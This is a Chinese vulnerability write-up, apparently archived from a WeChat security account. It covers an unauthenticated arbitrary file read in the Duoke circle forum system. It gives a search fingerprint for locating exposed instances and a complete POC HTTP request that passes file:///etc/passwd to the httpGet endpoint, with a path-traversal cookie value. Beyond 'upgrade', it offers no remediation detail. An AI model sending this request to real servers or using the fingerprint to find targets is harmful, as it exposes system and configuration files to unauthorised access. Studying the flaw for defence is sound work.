---
source: "gelusus/wxvl 公众号漏洞文库"
---

#  多客圈子论坛系统任意文件读取漏洞 附POC  
原创 安服仔
                    安服仔  北风漏洞复现文库   2026-01-29 01:22  
  
# 免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
#   
#   
  
01  
  
—  
  
漏洞名称  
  
多客圈子论坛系统任意文件读取漏洞  
  
02  
  
—  
  
影响版本  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/dV0OibMDwBhLTxND8mIPwiaca3HjpxsgMOHJiaPmELuHYPfCHgM308zZYsdRqhJOMrG4SCgMxibX5h14xETWictrwTg/640?wx_fmt=png&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=0 "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dV0OibMDwBhJyLoQ2TobeEXuUIwfOCfaRRY5snD0J4jqaWoEyXUYycrmgrya59pottW1Hvn28FzlqiaKgAOQWZEw/640?wx_fmt=png&from=appmsg "")  
  
  
03  
  
—  
  
漏洞简介  
  
多客圈子论坛系统是一种面向特定人群或特定话题的社交网络，它提供了用户之间交流、分享、讨论的  
平台。在这个系统中，用户可以创建、加入不同的圈子，圈子可以是基于兴趣、地域、职业等不同主题的。用户可以在圈子中发帖、评论、点赞等互动。社交圈子论坛系统除了提供基本的社交功能外，还可以根据用户行为和兴趣为用户推荐相关内容  
。  
未经身份验证的攻击者可通过该接口构造恶意请求，利用curl_exec  
函数读取系统重要文件，如/etc/passwd  
（Linux 系统用户信息文件）或数据库配置文件等。  
  
  
04  
  
—  
  
资产测绘  
```
body="/static/index/js/jweixin-1.2.0.js"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dV0OibMDwBhJyLoQ2TobeEXuUIwfOCfaRBaDnFrf3fbVxcIicKnxy8ofUTz6APS4rVC1FDXcdYwgvPDsKL6Zug9g/640?wx_fmt=png&from=appmsg "")  
  
  
05  
  
—  
  
漏洞复现  
  
POC  
```
GET /index.php/api/login/httpGet?url=file:///etc/passwd HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: think_var=..%2F..%2Fapplication%2Fdatabase; PHPSESSID=m0lgoj6m4hovmtisu1868cc8h5
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Pragma: no-cache
Cache-Control: no-cache
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dV0OibMDwBhJyLoQ2TobeEXuUIwfOCfaRGnZwxXmcNuTjJeDicos7Q4e1OZBPpicp0RaXiajPxmGCvApHI40Awe3ZA/640?wx_fmt=png&from=appmsg "")  
  
  
06  
  
—  
  
修复建议  
  
升级至最新版本  
  
  
  
07  
  
—  
  
往期回顾  
  
  
  
  


---

> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原文见文首链接）
